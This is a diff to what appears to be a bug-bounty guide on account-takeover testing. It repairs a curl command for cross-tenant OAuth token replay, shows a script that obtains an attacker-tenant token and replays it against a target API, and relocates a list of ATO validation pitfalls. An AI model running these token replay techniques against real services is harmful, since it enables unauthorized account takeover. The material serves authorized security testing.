@@ -321,7 +321,8 @@ curl --max-time 30 --connect-timeout 10 -v "https://login.microsoftonline.com/co
 # 1. Register same app client_id in YOUR tenant
 # 2. Authenticate as user in YOUR tenant → get access_token
 # 3. Use that token against the VICTIM's tenant API
-curl --max-time 30 --connect-timeout 10 -H "Authorization: Bearer *** https://victim-tenant.com/api/user/me
+TOKEN="<access_token_from_your_tenant>"
+curl --max-time 30 --connect-timeout 10 -H "Authorization: Bearer $TOKEN" "https://victim-tenant.com/api/user/me"
 # If accepted → the app doesn't validate the "tid" (tenant ID) claim → cross-tenant ATO
 ```
 
@@ -332,6 +333,20 @@ curl --max-time 30 --connect-timeout 10 -H "Authorization: Bearer *** https://vi
 TOKEN=$(curl --max-time 30 --connect-timeout 10 -s -X POST 'https://login.microsoftonline.com/attacker-tenant.onmicrosoft.com/oauth2/v2.0/token' -d 'client_id=xxx&scope=https://target.com/.default&grant_type=client_credentials&client_secret=xxx' | python3 -c 'import sys,json; print(json.load(sys.stdin).get("access_token",""))')
 curl --max-time 30 --connect-timeout 10 -s -H "Authorization: Bearer $TOKEN" "https://target.com/api/user/me" -w "\nHTTP %{http_code}"
 ```
+
+---
+
+## Pitfalls
+
+- **Self-ATO is not ATO** — changing your own password, resetting your own account, or locking yourself out proves nothing. You MUST demonstrate takeover of a SECOND test account (victim B) from attacker A's session/IP.
+- **Host-header injection without email confirmation** — the reflected header value appearing in a test response doesn't prove the reset link was poisoned. Read the actual email (use a Collaborator domain and a controlled victim B inbox).
+- **Predictable token without exploitation** — finding a pattern (sequential numeric, timestamp-based) is a primitive, not ATO. Demonstrate actual token prediction and account takeover.
+- **No-expiry token is not Critical alone** — a token that doesn't expire is a primitive. Combine with token-leak vector (Referer, open redirect, logs) to reach Critical.
+- **OAuth redirect_uri lax matching without subdomain takeover** — `redirect_uri=*.target.com` is only exploitable if you can host on a subdomain you control. Without takeover, this is Low at best.
+- **PKCE test with S256 but no check of plain fallback** — if the server accepts plain code_challenge_method but the client uses S256, the plain path is the vulnerability. Test both.
+- **Device code flow polling interval** — if the interval is 5 seconds, brute-force is impractical. Only exploitable when the interval is very short (<1s) or the code space is small.
+- **Cross-tenant token replay without token validation** — if the `tid` (tenant ID) claim is validated by the API, cross-tenant replay fails. Verify the token is accepted before reporting.
+- **Cookie theft chain without demonstrating the chain** — "if an attacker steals the cookie" is not a finding. Demonstrate the theft vector (XSS, token leak, MITM) or chain with a real cookie-leak primitive.
 
 ---
 
@@ -365,21 +380,6 @@ Run this self-test to confirm ATO hunting readiness:
    ```
 
 All 4 tests verify the ATO hunting methodology is properly documented.
-
-
----
-
-## Pitfalls
-
-- **Self-ATO is not ATO** — changing your own password, resetting your own account, or locking yourself out proves nothing. You MUST demonstrate takeover of a SECOND test account (victim B) from attacker A's session/IP.
-- **Host-header injection without email confirmation** — the reflected header value appearing in a test response doesn't prove the reset link was poisoned. Read the actual email (use a Collaborator domain and a controlled victim B inbox).
-- **Predictable token without exploitation** — finding a pattern (sequential numeric, timestamp-based) is a primitive, not ATO. Demonstrate actual token prediction and account takeover.
-- **No-expiry token is not Critical alone** — a token that doesn't expire is a primitive. Combine with token-leak vector (Referer, open redirect, logs) to reach Critical.
-- **OAuth redirect_uri lax matching without subdomain takeover** — `redirect_uri=*.target.com` is only exploitable if you can host on a subdomain you control. Without takeover, this is Low at best.
-- **PKCE test with S256 but no check of plain fallback** — if the server accepts plain code_challenge_method but the client uses S256, the plain path is the vulnerability. Test both.
-- **Device code flow polling interval** — if the interval is 5 seconds, brute-force is impractical. Only exploitable when the interval is very short (<1s) or the code space is small.
-- **Cross-tenant token replay without token validation** — if the `tid` (tenant ID) claim is validated by the API, cross-tenant replay fails. Verify the token is accepted before reporting.
-- **Cookie theft chain without demonstrating the chain** — "if an attacker steals the cookie" is not a finding. Demonstrate the theft vector (XSS, token leak, MITM) or chain with a real cookie-leak primitive.
 
 ---
 
